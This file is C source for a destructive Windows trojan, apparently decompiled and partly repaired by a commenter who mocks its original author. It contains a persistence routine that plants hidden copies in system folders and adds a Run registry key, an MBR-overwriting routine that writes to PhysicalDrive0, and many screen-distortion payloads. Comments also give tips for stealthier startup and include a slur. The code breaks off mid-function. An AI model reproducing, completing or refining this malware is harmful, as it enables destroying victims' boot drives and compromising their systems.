// this garbage was compiled with MinGW(GCC)
// so took me like 2 hours to do it

// anyways be aware of memory leaks
// the minimal time before it can crash
// is literally 30 seconds (after the first effect)

// this is aswell not using CloseHandle after creating a thread
// and not using fast math

// some parts of this shitti code was normalized
// but some wasn't

// who needs this shitti skiddi garbage anyway

// name of the functions are aswell weird
// for example [ ExecuteMBRPattern ]
// it's just running more threads with gdi stuff
// doing completely different things from what the
// function name says.

// aswell they sound kinda weird and it makes
// me think that the creator of this slop
// just used ChatGPT or whatever AI to make
// some parts of the code

// L!


// none of shaders were using DeleteDC or DeleteObject
// so it was also increasing memory-leaking chance
// almost on every payload

// initializing destination dc & screen width & screen height
// only once, so if user will change resolution
// the effects wouldn't be able to render correctly

// aswell renderer system doesn't work on 4k monitors
// even without changing resolution on them.

// the infector (just a default startup and aswell using Run
// which is a worst way for startup, use either userinit or explorer
// they're faster, and harder to find, rather than just Run)

// MBR is aswell so cringe, I think he made it using GIMP lol
// most of payloads have wrong center coordinates
// same with mbr, text isn't on the center of image

// such a big L to the creator of this
// :DD

// i fixed most of the memory leaks, aswell the infector
// but didn't added fast math and didn't optimize the code well
// because you can do it yourself
// same with changing void** to RGBQUAD struct, it's not that hard
// and as I said below
// it's BGR
// not RGB
// if you're going to convert it to RGBQUAD
// +2 -> blue;
// +1 -> green;
// +0(nothing) -> red;


// anyways thanks to noobesgt for helping me
// you should check out his stuff aswell!

// https://github.com/reservedcloud/
// https://github.com/noobes1337/
// https://github.com/LynxMalware/

// https://github.com/Anti-Skids/

// https://www.unknowncheats.me/forum/members/2870304.html

// alright, enough with yappin' about this shit
// had fun, decompilin' and laughing on this slop

#include <Windows.h>

#include <math.h>

#include "rdata.hh"

#pragma comment( lib, "Winmm.lib" )

INT _x, _y, _w, _h;

// init -> Initialize
// Gl   ->     Global
// Vars ->  Variables

// incase if you're dumb
// :grin:
VOID initGlVars( VOID )
{
    // original variables values
    // was really weird
    // and wasn't the thing that the variable name was
    // X was CX
    // Y was CY
    // W was CX
    // H was CY
    // so X & Y variables should be X & Y positions of screen
    // the developer probably thinks he is cool or something
    // but nah, it is the most dumbest mistake, or even wasn't
    // a mistake, and dev is really that dumb that he don't know
    // what is X and what is CX
    // what is Y and what is CY
    _x = GetSystemMetrics( SM_XVIRTUALSCREEN );
    _y = GetSystemMetrics( SM_YVIRTUALSCREEN );

    _w = GetSystemMetrics( SM_CXVIRTUALSCREEN );
    _h = GetSystemMetrics( SM_CYVIRTUALSCREEN );
}

BOOL WINAPI EndHandle(
    IN HANDLE Handle )
{
    TerminateThread( Handle, EXIT_SUCCESS );
    CloseHandle( Handle );

    return FALSE;
}

typedef struct
{
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;

HSL rgbQuadToHSV(RGBQUAD rgb)
{
    HSL hsl;

    BYTE r = rgb.rgbRed;
    BYTE g = rgb.rgbGreen;
    BYTE b = rgb.rgbBlue;

    FLOAT _r = (FLOAT)r / 255.f;
    FLOAT _g = (FLOAT)g / 255.f;
    FLOAT _b = (FLOAT)b / 255.f;

    FLOAT rgbMin = min(min(_r, _g), _b);
    FLOAT rgbMax = max(max(_r, _g), _b);

    FLOAT fDelta = rgbMax - rgbMin;
    FLOAT deltaR;
    FLOAT deltaG;
    FLOAT deltaB;

    FLOAT h = 0.f;
    FLOAT s = 0.f;
    FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

    if (fDelta != 0.f)
    {
        s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
        deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
        deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
        deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

        if (_r == rgbMax)      h = deltaB - deltaG;
        else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
        else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
        if (h < 0.f)           h += 1.f;
        if (h > 1.f)           h -= 1.f;
    }

    hsl.h = h;
    hsl.s = s;
    hsl.l = l;
    return hsl;
}

RGBQUAD hsvToRGB(HSL hsl)
{
    RGBQUAD rgb;

    FLOAT r = hsl.l;
    FLOAT g = hsl.l;
    FLOAT b = hsl.l;

    FLOAT h = hsl.h;
    FLOAT sl = hsl.s;
    FLOAT l = hsl.l;
    FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

    FLOAT m;
    FLOAT sv;
    FLOAT fract;
    FLOAT vsf;
    FLOAT mid1;
    FLOAT mid2;

    INT sextant;

    if (v > 0.f)
    {
        m = l + l - v;
        sv = (v - m) / v;
        h *= 6.f;
        sextant = (INT)h;
        fract = h - sextant;
        vsf = v * sv * fract;
        mid1 = m + vsf;
        mid2 = v - vsf;

        switch (sextant)
        {
        case 0:
            r = v;
            g = mid1;
            b = m;
            break;
        case 1:
            r = mid2;
            g = v;
            b = m;
            break;
        case 2:
            r = m;
            g = v;
            b = mid1;
            break;
        case 3:
            r = m;
            g = mid2;
            b = v;
            break;
        case 4:
            r = mid1;
            g = m;
            b = v;
            break;
        case 5:
            r = v;
            g = m;
            b = mid2;
            break;
        }
    }

    rgb.rgbRed = (BYTE)(r * 255.f);
    rgb.rgbGreen = (BYTE)(g * 255.f);
    rgb.rgbBlue = (BYTE)(b * 255.f);

    return rgb;
}

VOID __fastcall SplitBlt(HDC dc, int a2, int a3, int a4, DWORD rop)
{
    BitBlt(dc, -a2, -a2, a3 / 2, a4 / 2, dc, 0, 0, rop);
    BitBlt(dc, a2 + a3 / 2, -a2, a3 / 2, a4 / 2, dc, a3 / 2, 0, rop);
    BitBlt(dc, -a2, a4 / 2 + a2, a3 / 2, a4 / 2, dc, 0, a4 / 2, rop);
    BitBlt(dc, a2 + a3 / 2, a4 / 2 + a2, a3 / 2, a4 / 2, dc, a3 / 2, a4 / 2, rop);
}

BOOL ifWindowsXP( VOID )
{
    OSVERSIONINFOA VersionInformation;
    RtlZeroMemory(
        &VersionInformation,
        sizeof( VersionInformation ) );

    VersionInformation.dwOSVersionInfoSize = sizeof( VersionInformation );
    GetVersionExA( &VersionInformation );

    // Major = 5 
    //  =>

    // Windows Server 2003 R2
    // Windows Server 2003
    // Windows XP
    // Windows 2000

    // Minor wasn't even touched in there
    // probably creator is just too dumb
    // that he just took this code from
    // somewhere else, and slapped it into
    // his shitti project, without even
    // changing anything else in it.
    return VersionInformation.dwMajorVersion == 5;
}

DWORD WINAPI Wallpaper(
    IN LPVOID lpvThreadParameter )
{
    DWORD NumberOfBytesWritten;
    HANDLE hFile;

    // epic gamer move
    // CreateDirectoryW("C", 0LL);
    // CreateDirectoryW( L"C", NULL );
    
    // so unfunny

    // FILE_ATTRIBUTE_NORMAL lmao
    hFile = CreateFileW( L"C:\\H\\RIZZ.jpg", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
    WriteFile( hFile, HexData2, sizeof( HexData2 ), &NumberOfBytesWritten, NULL );

    SystemParametersInfoA( SPI_SETDESKWALLPAPER, 0u, "C:/H/RIZZ.jpg", SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE );

    CloseHandle( hFile );

    return FALSE;
}

LPWSTR GetFileDirW(void)
{
    LPWSTR Filename = (LPWSTR)VirtualAlloc(NULL, (MAX_PATH + 1) * sizeof(WCHAR), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (Filename)
    {
        GetModuleFileNameW(NULL, Filename, MAX_PATH);
    }
    
    return Filename;
}

VOID __fastcall CopyFileExt(
    LPCWSTR lpExistingFileName,
    LPCWSTR lpNewFileName,
    DWORD dwAttributes,
    BOOL bFailIfExists)
{
    CopyFileW(lpExistingFileName, lpNewFileName, bFailIfExists);
    SetFileAttributesW(lpNewFileName, dwAttributes);
}

VOID __fastcall RegistryW(
    HKEY hKey,
    LPCWSTR lpSubKey,
    LPCWSTR lpValueName,
    DWORD dwType,
    LPCWSTR lpData)
{
    HKEY hResult;
    
    RegCreateKeyW(hKey, lpSubKey, &hResult);
    RegSetValueExW(hResult, lpValueName, 0, REG_SZ,
        (const BYTE*)lpData, (lstrlenW(lpData) + 1) * sizeof(WCHAR));

    RegCloseKey(hResult);
}

DWORD WINAPI InfectSystem(LPVOID lpThreadParameter)
{
    WCHAR* FileDirW;
    LPCWSTR v5[3];
    int i;

    FileDirW = GetFileDirW();

    v5[0] = L"C:\\Windows\\System32\\finale.exe";
    v5[1] = L"C:\\Windows\\cmmgr.exe";
    v5[2] = L"C:\\WINDOWS\\cmdbtcfg.dat";
    // why not using _countof()?
    // aswell maybe he did it because
    // of the checks in entry point
    // but it's so fucking dumb
    // then why did he inserted it here
    // and left it unused

    for (i = 0; i < _countof(v5); i++)
    {
        // without FILE_ATTRIBUTE_SYSTEM
        // wow, such a...
        CopyFileExt(FileDirW, v5[i], FILE_ATTRIBUTE_HIDDEN, TRUE);

        RegistryW(
            HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RUN",
            L"Lois I Am Cumming", // so unfunny
            REG_SZ,
            v5[0]);
    }

    VirtualFree(FileDirW, 0, MEM_RELEASE);

    return FALSE;
}

DWORD WINAPI EraseMBR(LPVOID lpThreadParameter)
{
    DWORD NumberOfBytesWritten; // [rsp+44h] [rbp-Ch] BYREF
    HANDLE hFile; // [rsp+48h] [rbp-8h]

    hFile = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    WriteFile(hFile, HexData, sizeof(HexData), &NumberOfBytesWritten, NULL);

    CloseHandle(hFile);

    return FALSE;
}

DWORD WINAPI RGBQUAD1(LPVOID lpThreadParameter)
{
    HBITMAP v1; // rax
    BITMAPINFO pbmi; // [rsp+60h] [rbp-90h] BYREF
    void* ppvBits; // [rsp+98h] [rbp-58h] BYREF
    int v4; // [rsp+A0h] [rbp-50h]
    int v8; // [rsp+B0h] [rbp-40h]
    int v9; // [rsp+B4h] [rbp-3Ch]
    int v11; // [rsp+BCh] [rbp-34h]
    int v12; // [rsp+C0h] [rbp-30h]
    int v13; // [rsp+C4h] [rbp-2Ch]
    HDC hdcDest; // [rsp+C8h] [rbp-28h]
    int hDest; // [rsp+D4h] [rbp-1Ch]
    int wDest; // [rsp+D8h] [rbp-18h]
    HDC hdc; // [rsp+E0h] [rbp-10h]
    int j; // [rsp+E8h] [rbp-8h]
    int i; // [rsp+ECh] [rbp-4h]

    hdc = GetDC(HWND_DESKTOP);
    while (TRUE)
    {
        wDest = _w;
        hDest = _h;
        hdcDest = CreateCompatibleDC(hdc);
        pbmi.bmiHeader.biSize               = sizeof( pbmi );
        pbmi.bmiHeader.biWidth              = wDest;
        pbmi.bmiHeader.biHeight             = hDest;
        pbmi.bmiHeader.biPlanes             = 1;
        pbmi.bmiHeader.biBitCount           = 32;
        pbmi.bmiHeader.biCompression        = BI_RGB;
        v13 = rand( ) % _w + 1;
        v12 = rand( ) % _h + 1;
        v1 = CreateDIBSection(hdc, &pbmi, DIB_RGB_COLORS, &ppvBits, NULL, 0);
        SelectObject(hdcDest, v1);
        StretchBlt(hdcDest, 0, 0, wDest, hDest, hdc, 0, 0, _w, _h, SRCCOPY);
        for (i = 0; i < wDest; ++i)
        {
            for (j = 0; j < hDest; ++j)
            {
                v11 = wDest * j + i;
                v9 = i - (v13 + 1) / 2;
                v8 = j - (v12 + 1) / 2;
                *((PBYTE)ppvBits + 4 * v11) = v9 * (i - (v13 + 1) / 2);
                *((PBYTE)ppvBits + 4 * v11 + 2) = j ^ i;
            }
        }
        StretchBlt(hdc, 0, 0, _w, _h, hdcDest, 0, 0, wDest, hDest, SRCCOPY);
        DeleteDC(hdcDest);
        DeleteObject(v1);
        Sleep(10);
    }
}

DWORD WINAPI RGBQUAD2(LPVOID lpThreadParameter)
{
    HBITMAP v1; // rax
    double v2; // xmm6_8
    double v3; // xmm0_8
    double v4; // xmm6_8
    double v5; // xmm7_8
    BITMAPINFO pbmi; // [rsp+60h] [rbp-90h] BYREF
    void* ppvBits; // [rsp+90h] [rbp-60h] BYREF
    int v8; // [rsp+98h] [rbp-58h]
    int v9; // [rsp+9Ch] [rbp-54h]
    int v10; // [rsp+A0h] [rbp-50h]
    int v11; // [rsp+A4h] [rbp-4Ch]
    HDC hdcDest; // [rsp+A8h] [rbp-48h]
    int hDest; // [rsp+B0h] [rbp-40h]
    int wDest; // [rsp+B4h] [rbp-3Ch]
    HDC hdc; // [rsp+B8h] [rbp-38h]
    int j; // [rsp+C4h] [rbp-2Ch]
    int i; // [rsp+C8h] [rbp-28h]
    int v18; // [rsp+CCh] [rbp-24h]

    hdc = GetDC(HWND_DESKTOP);
    v18 = 0;
    while (TRUE)
    {
        wDest = _w / 2;
        hDest = _h / 2;
        hdcDest = CreateCompatibleDC(hdc);
        pbmi.bmiHeader.biSize               = sizeof( pbmi );
        pbmi.bmiHeader.biWidth              = wDest;
        pbmi.bmiHeader.biHeight             = hDest;
        pbmi.bmiHeader.biPlanes             = 1;
        pbmi.bmiHeader.biBitCount           = 32;
        pbmi.bmiHeader.biCompression        = BI_RGB;
        v11 = rand( ) % _w;
        v10 = rand( ) % _h;
        v1 = CreateDIBSection(hdc, &pbmi, DIB_RGB_COLORS, &ppvBits, NULL, 0);
        SelectObject(hdcDest, v1);
        StretchBlt(hdcDest, 0, 0, wDest, hDest, hdc, 0, 0, _w, _h, SRCCOPY);
        for (i = 0; i < wDest; ++i)
        {
            for (j = 0; j < hDest; ++j)
            {
                v9 = wDest * j + i;
                v2 = (double)(4 * v18);
                v3 = ceil((double)i / 32.0);
                v4 = v2 + v3 * v2 + (double)(4 * v18);
                v5 = (double)(4 * v18);
                v8 = (int)(ceil((double)j / 24.0) * v5 + v4);
                *((PBYTE)ppvBits + 4 * v9) = v8;
            }
        }
        ++v18;
        StretchBlt(hdc, 0, 0, _w, _h, hdcDest, 0, 0, wDest, hDest, SRCCOPY);
        DeleteDC(hdcDest);
        DeleteObject(v1);
        Sleep(10);
    }
}

DWORD WINAPI StrongWaves(LPVOID lpThreadParameter)
{
    double v1; // xmm0_8
    double v2; // xmm0_8
    HBITMAP h; // [rsp+68h] [rbp-28h]
    HDC hdcSrc; // [rsp+70h] [rbp-20h]
    HDC hdc; // [rsp+78h] [rbp-18h]
    int x; // [rsp+80h] [rbp-10h]
    int y; // [rsp+84h] [rbp-Ch]
    double v8; // [rsp+88h] [rbp-8h]

    v8 = 0.0;
    hdc = GetDC(HWND_DESKTOP);
    hdcSrc = CreateCompatibleDC(hdc);
    h = CreateCompatibleBitmap(hdc, _w, _h);
    SelectObject(hdcSrc, h);
    while (TRUE)
    {
        BitBlt(hdcSrc, 0, 0, _w, _h, hdc, 0, 0, SRCCOPY);
        for (y = 0; _w + _h > y; ++y)
        {
            v1 = tan(v8);
            BitBlt(hdc, 0, y, _w, 1, hdcSrc, (int)(1000.0 * v1), y, SRCCOPY);
            v8 = v8 + 0.003490655555555556; // indeed
        }
        Sleep(10);
        for (x = 0; _w + _h > x; ++x)
        {
            v2 = tan(v8);
            BitBlt(hdc, x, 0, 1, _h, hdcSrc, x, (int)(900.0 * v2), SRCCOPY);
            v8 = v8 + 0.003490655555555556; // indeed
        }
        Sleep(10);
    }
}

// nice function name
// niggi
DWORD WINAPI Plg1(LPVOID lpThreadParameter)
{
    HWND DesktopWindow; // rax
    double v2; // xmm6_8
    float v3; // xmm2_4
    POINT Point[3]; // [rsp+50h] [rbp-60h] BYREF
    int v5; // [rsp+58h] [rbp-58h]
    int v6; // [rsp+5Ch] [rbp-54h]
    int v7; // [rsp+60h] [rbp-50h]
    int v8; // [rsp+64h] [rbp-4Ch]
    RECT Rect; // [rsp+70h] [rbp-40h] BYREF
    int v10; // [rsp+8Ch] [rbp-24h]
    HDC hdcDest; // [rsp+90h] [rbp-20h]
    float v12; // [rsp+9Ch] [rbp-14h]

    hdcDest = GetDC(HWND_DESKTOP);
    v12 = 0.0;
    while (TRUE)
    {
        DesktopWindow = GetDesktopWindow();
        // worst way to get screen bounds ever.
        // dev probably having no idea what is
        // he even doing in there, lol!
        GetWindowRect(DesktopWindow, &Rect);
        v2 = cos(v12) * 50.0;
        v10 = (int)(65.0 * tan(v12) + v2);
        Point[0].x = Rect.left + v10;
        Point[0].y = Rect.top - v10;
        Point[1].x = Rect.right + v10;
        Point[1].y = Rect.top + v10;
        Point[2].x = Rect.left - v10;
        Point[2].y = Rect.bottom - v10;
        PlgBlt(hdcDest, Point, hdcDest, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0LL, 0, 0);
        v3 = v12 + 0.2094395102393195;
        v12 = v3;
        Sleep(1);
    }
}

DWORD WINAPI Bounce(LPVOID lpThreadParameter)
{
    double v1; // xmm1_8
    float v2; // xmm2_4
    int xDest; // [rsp+6Ch] [rbp-14h]
    HDC hdcDest; // [rsp+70h] [rbp-10h]
    float v5; // [rsp+7Ch] [rbp-4h]

    v5 = 0.0;
    while (TRUE)
    {
        hdcDest = GetDC(HWND_DESKTOP);
        xDest = (int)(30.0 * cos(v5));
        v1 = sin(v5);
        BitBlt(hdcDest, xDest, (int)(30.0 * v1), _w, _h, hdcDest, 0, 0, SRCCOPY);
        ReleaseDC(HWND_DESKTOP, hdcDest);
        v2 = v5 + 0.2094395102393195;
        v5 = v2;
        Sleep(10);
    }
}

DWORD WINAPI RGBQUAD3(LPVOID lpThreadParameter)
{
    HBITMAP v1; // rax
    BITMAPINFO pbmi; // [rsp+60h] [rbp-70h] BYREF
    void* ppvBits; // [rsp+90h] [rbp-40h] BYREF
    int v4; // [rsp+9Ch] [rbp-34h]
    int v5; // [rsp+A0h] [rbp-30h]
    int v6; // [rsp+A4h] [rbp-2Ch]
    HDC hdcDest; // [rsp+A8h] [rbp-28h]
    int hDest; // [rsp+B4h] [rbp-1Ch]
    int wDest; // [rsp+B8h] [rbp-18h]
    int v10; // [rsp+BCh] [rbp-14h]
    HDC hdc; // [rsp+C0h] [rbp-10h]
    int j; // [rsp+C8h] [rbp-8h]
    int i; // [rsp+CCh] [rbp-4h]

    hdc = GetDC(HWND_DESKTOP);
    v10 = 0;
    while (TRUE)
    {
        wDest = _w / 2;
        hDest = _h / 2;
        hdcDest = CreateCompatibleDC(hdc);
        pbmi.bmiHeader.biSize               = sizeof( pbmi );
        pbmi.bmiHeader.biWidth              = wDest;
        pbmi.bmiHeader.biHeight             = hDest;
        pbmi.bmiHeader.biPlanes             = 1;
        pbmi.bmiHeader.biBitCount           = 32;
        pbmi.bmiHeader.biCompression        = BI_RGB;
        v6 = rand( ) % _w;
        v5 = rand( ) % _h;
        v1 = CreateDIBSection(hdc, &pbmi, DIB_RGB_COLORS, &ppvBits, NULL, 0);
        SelectObject(hdcDest, v1);
        StretchBlt(hdcDest, 0, 0, wDest, hDest, hdc, 0, 0, _w, _h, SRCCOPY);
        for (i = 0; i < wDest; ++i)
        {
            for (j = 0; j < hDest; ++j)
            {
                v4 = wDest * j + i;
                *((BYTE*)ppvBits + 4 * v4 + 2) += j;
                *((BYTE*)ppvBits + 4 * v4 + 1) += i;
                *((BYTE*)ppvBits + 4 * v4) -= 1;
            }
        }
        StretchBlt(hdc, 0, 0, _w, _h, hdcDest, 0, 0, wDest, hDest, SRCCOPY);
        DeleteDC(hdcDest);
        DeleteObject(v1);
        Sleep(10);
    }
}

DWORD WINAPI RGBQUAD4(LPVOID lpThreadParameter)
{
    HBITMAP v1; // rax
    BITMAPINFO pbmi; // [rsp+60h] [rbp-70h] BYREF
    void* ppvBits; // [rsp+90h] [rbp-40h] BYREF
    int v4; // [rsp+9Ch] [rbp-34h]
    int v5; // [rsp+A0h] [rbp-30h]
    int v6; // [rsp+A4h] [rbp-2Ch]
    HDC hdcDest; // [rsp+A8h] [rbp-28h]
    int hDest; // [rsp+B4h] [rbp-1Ch]
    int wDest; // [rsp+B8h] [rbp-18h]
    int v10; // [rsp+BCh] [rbp-14h]
    HDC hdc; // [rsp+C0h] [rbp-10h]
    int j; // [rsp+C8h] [rbp-8h]
    int i; // [rsp+CCh] [rbp-4h]

    hdc = GetDC(HWND_DESKTOP);
    v10 = 0;
    while (TRUE)
    {
        wDest = _w / 3;
        hDest = _h / 3;
        hdcDest = CreateCompatibleDC(hdc);
        pbmi.bmiHeader.biSize               = sizeof( pbmi );
        pbmi.bmiHeader.biWidth              = wDest;
        pbmi.bmiHeader.biHeight             = hDest;
        pbmi.bmiHeader.biPlanes             = 1;
        pbmi.bmiHeader.biBitCount           = 32;
        pbmi.bmiHeader.biCompression        = BI_RGB;
        v6 = rand() % _w;
        v5 = rand() % _h;
        v1 = CreateDIBSection(hdc, &pbmi, DIB_RGB_COLORS, &ppvBits, NULL, 0);
        SelectObject(hdcDest, v1);
        StretchBlt(hdcDest, 0, 0, wDest, hDest, hdc, 0, 0, _w, _h, SRCCOPY);
        for (i = 0; i < wDest; ++i)
        {
            for (j = 0; j < hDest; ++j)
            {
                v4 = wDest * j + i;
                *((BYTE*)ppvBits + 4 * v4 + 2) += j * i;
                *((BYTE*)ppvBits + 4 * v4 + 1) += 24;
                *((BYTE*)ppvBits + 4 * v4) -= 1;
            }
        }
        StretchBlt(hdc, 0, 0, _w, _h, hdcDest, 0, 0, wDest, hDest, SRCCOPY);
        DeleteDC(hdcDest);
        DeleteObject(v1);
        Sleep(10);
    }
}

DWORD WINAPI RGBQUAD5(LPVOID lpThreadParameter)
{
    HBITMAP v1; // rax
    BITMAPINFO pbmi; // [rsp+60h] [rbp-70h] BYREF
    void* ppvBits; // [rsp+90h] [rbp-40h] BYREF
    int v4; // [rsp+9Ch] [rbp-34h]
    int v5; // [rsp+A0h] [rbp-30h]
    int v6; // [rsp+A4h] [rbp-2Ch]
    HDC hdcDest; // [rsp+A8h] [rbp-28h]
    int hDest; // [rsp+B4h] [rbp-1Ch]
    int wDest; // [rsp+B8h] [rbp-18h]
    int v10; // [rsp+BCh] [rbp-14h]
    HDC hdc; // [rsp+C0h] [rbp-10h]
    int j; // [rsp+C8h] [rbp-8h]
    int i; // [rsp+CCh] [rbp-4h]

    hdc = GetDC(HWND_DESKTOP);
    v10 = 0;
    while (TRUE)
    {
        wDest = _w / 2;
        hDest = _h / 2;
        hdcDest = CreateCompatibleDC(hdc);
        pbmi.bmiHeader.biSize               = sizeof( pbmi );
        pbmi.bmiHeader.biWidth              = wDest;
        pbmi.bmiHeader.biHeight             = hDest;
        pbmi.bmiHeader.biPlanes             = 1;
        pbmi.bmiHeader.biBitCount           = 32;
        pbmi.bmiHeader.biCompression        = BI_RGB;
        v6 = rand() % _w;
        v5 = rand() % _h;
        v1 = CreateDIBSection(hdc, &pbmi, DIB_RGB_COLORS, &ppvBits, NULL, 0);
        SelectObject(hdcDest, v1);
        StretchBlt(hdcDest, 0, 0, wDest, hDest, hdc, 0, 0, _w, _h, SRCCOPY);
        for (i = 0; i < wDest; ++i)
        {
            for (j = 0; j < hDest; ++j)
            {
                v4 = wDest * j + i;
                *((BYTE*)ppvBits + 4 * v4 + 2) += (j + 23) & i;
                *((BYTE*)ppvBits + 4 * v4 + 1) += (j - 1) ^ i;
            }
        }
        StretchBlt(hdc, 0, 0, _w, _h, hdcDest, 0, 0, wDest, hDest, SRCCOPY);
        DeleteDC(hdcDest);
        DeleteObject(v1);
        Sleep(10);
    }
}

DWORD WINAPI Split1(LPVOID lpThreadParameter)
{
    HDC i; // [rsp+38h] [rbp-8h]

    i = GetDC(HWND_DESKTOP);
    while (TRUE)
    {
        SplitBlt(i, 5, _w, _h, SRCAND);
        SplitBlt(i, 5, _w, _h, SRCINVERT);
        SplitBlt(i, 5, _w, _h, SRCPAINT);
    }
}

DWORD WINAPI HSVFx1(LPVOID lpvThreadParameter)
{
    HBITMAP v1;
    BITMAPINFO pbmi;
    RGBQUAD* rgbQuad;
    HDC hdcDest;
    HDC hdc;
    INT j;
    INT i;
    
    hdc = GetDC( HWND_DESKTOP );

    while ( TRUE )
    {
        pbmi.bmiHeader.biSize               = sizeof( pbmi );
        pbmi.bmiHeader.biWidth              = _w;
        pbmi.bmiHeader.biHeight             = _h;
        pbmi.bmiHeader.biPlanes             = 1;
        pbmi.bmiHeader.biBitCount           = 32;
        pbmi.bmiHeader.biCompression        = BI_RGB;

        hdcDest = CreateCompatibleDC(hdc );
        v1 = CreateDIBSection( hdc, &pbmi, DIB_RGB_COLORS, ( PVOID* )&rgbQuad, NULL, 0);

        SelectObject( hdcDest, v1 );

        BitBlt( hdcDest, 0, 0, _w, _h, hdc, 0, 0, SRCCOPY );

        RGBQUAD rgbquadCopy;
        HSL hslcolor;

        for ( i = 0; i < _w; i++ )
        {
            for ( j = 0; j < _h; j++ )
            {
                INT index = j * _w + i;
                FLOAT fx = i;

                rgbquadCopy = rgbQuad[ index ];

                hslcolor = rgbQuadToHSV( rgbquadCopy );

                // no fast math and no brain, WoW!
                hslcolor.h = fmodf( fx / 500.f + hslcolor.h + .02f, 1.f );
                hslcolor.s = 1.f;
                hslcolor.l = .5f;

                rgbQuad[ index ] = hsvToRGB( hslcolor );
            }
        }

        BitBlt( hdc, 0, 0, _w, _h, hdcDest, 0, 0, SRCCOPY );
        
        DeleteObject( v1 );
        DeleteDC( hdcDest );

        Sleep( 10 );
    }
}

DWORD WINAPI RGBQUAD6(LPVOID lpThreadParameter)
{
    HBITMAP v1; // rax
    BITMAPINFO pbmi; // [rsp+60h] [rbp-70h] BYREF
    void* ppvBits; // [rsp+90h] [rbp-40h] BYREF
    int v4; // [rsp+98h] [rbp-38h]
    int v5; // [rsp+9Ch] [rbp-34h]
    int v6; // [rsp+A0h] [rbp-30h]
    int v7; // [rsp+A4h] [rbp-2Ch]
    HDC hdcDest; // [rsp+A8h] [rbp-28h]
    int hDest; // [rsp+B0h] [rbp-20h]
    int wDest; // [rsp+B4h] [rbp-1Ch]
    HDC hdc; // [rsp+B8h] [rbp-18h]
    int j; // [rsp+C4h] [rbp-Ch]
    int i; // [rsp+C8h] [rbp-8h]
    int v14; // [rsp+CCh] [rbp-4h]

    hdc = GetDC(HWND_DESKTOP);
    v14 = 0;
    while (TRUE)
    {
        wDest = _w / 8;
        hDest = _h / 8;
        hdcDest = CreateCompatibleDC(hdc);
        pbmi.bmiHeader.biSize               = sizeof( pbmi );
        pbmi.bmiHeader.biWidth              = wDest;
        pbmi.bmiHeader.biHeight             = hDest;
        pbmi.bmiHeader.biPlanes             = 1;
        pbmi.bmiHeader.biBitCount           = 32;
        pbmi.bmiHeader.biCompression        = BI_RGB;
        v7 = rand() % _w;
        v6 = rand() % _h;
        v1 = CreateDIBSection(hdc, &pbmi, DIB_RGB_COLORS, &ppvBits, NULL, 0);
        SelectObject(hdcDest, v1);
        StretchBlt(hdcDest, 0, 0, wDest, hDest, hdc, 0, 0, _w, _h, SRCCOPY);
        for (i = 0; i < wDest; ++i)
        {
            for (j = 0; j < hDest; ++j)
            {
                v5 = wDest * j + i;
                v4 = i ^ (j * (i + 1) + i);
                *((BYTE*)ppvBits + 4 * v5 + 2) = (i ^ (j * (i + 1) + i)) - 1;
                *((BYTE*)ppvBits + 4 * v5) = j & i ^ v4;
            }
        }
        ++v14;
        StretchBlt(hdc, 0, 0, _w, _h, hdcDest, 0, 0, wDest, hDest, SRCCOPY);
        DeleteDC(hdcDest);
        DeleteObject(v1);
        Sleep(10);
    }
}

DWORD WINAPI RGBQUADFINAL(LPVOID lpThreadParameter)
{
    HBITMAP v1; // rax
    int v2; // eax
    BITMAPINFO pbmi; // [rsp+60h] [rbp-70h] BYREF
    void* ppvBits; // [rsp+90h] [rbp-40h] BYREF
    unsigned int v5; // [rsp+98h] [rbp-38h]
    int v6; // [rsp+9Ch] [rbp-34h]
    int v7; // [rsp+A0h] [rbp-30h]
    int v8; // [rsp+A4h] [rbp-2Ch]
    HDC hdcDest; // [rsp+A8h] [rbp-28h]
    int hDest; // [rsp+B4h] [rbp-1Ch]
    int wDest; // [rsp+B8h] [rbp-18h]
    int v12; // [rsp+BCh] [rbp-14h]
    HDC hdc; // [rsp+C0h] [rbp-10h]
    int j; // [rsp+C8h] [rbp-8h]
    int i; // [rsp+CCh] [rbp-4h]

    hdc = GetDC(HWND_DESKTOP);
    v12 = 0;
    while (TRUE)
    {
        wDest = _w / 8;
        hDest = _h / 8;
        hdcDest = CreateCompatibleDC(hdc);
        pbmi.bmiHeader.biSize               = sizeof( pbmi );
        pbmi.bmiHeader.biWidth              = wDest;
        pbmi.bmiHeader.biHeight             = hDest;
        pbmi.bmiHeader.biPlanes             = 1;
        pbmi.bmiHeader.biBitCount           = 32;
        pbmi.bmiHeader.biCompression        = BI_RGB;
        v8 = rand() % _w;
        v7 = rand() % _h;
        v1 = CreateDIBSection(hdc, &pbmi, DIB_RGB_COLORS, &ppvBits, NULL, 0);
        SelectObject(hdcDest, v1);
        StretchBlt(hdcDest, 0, 0, wDest, hDest, hdc, 0, 0, _w, _h, SRCCOPY);
        for (i = 0; i < wDest; ++i)
        {
            for (j = 0; j < hDest; ++j)
            {
                v6 = wDest * j + i;
                v2 = rand();
                v5 = 0x10101 * ((unsigned __int8)(((unsigned int)(v2 >> 31) >> 24) + v2) - ((unsigned int)(v2 >> 31) >> 24));
                *((BYTE*)ppvBits + 4 * v6 + 2) = v2;
                *((BYTE*)ppvBits + 4 * v6 + 1) = v5;
                *((BYTE*)ppvBits + 4 * v6) = v5;
            }
        }
